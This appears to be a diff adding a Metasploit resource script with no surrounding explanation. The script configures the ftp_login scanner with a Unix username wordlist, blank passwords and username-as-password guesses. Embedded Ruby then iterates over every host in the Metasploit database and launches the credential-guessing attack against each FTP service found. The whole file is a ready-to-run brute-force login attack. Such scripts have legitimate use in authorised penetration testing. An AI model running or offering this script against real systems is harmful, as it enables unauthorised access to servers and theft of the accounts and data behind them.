@@ -1,0 +1,19 @@
+use auxiliary/scanner/ftp/ftp_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set BLANK_PASSWORDS true
+set USER_AS_PASS true
+unset PASS_FILE
+set VERBOSE false
+set THREADS 10
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "ftp"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+    end
+  end
+end
+</ruby>
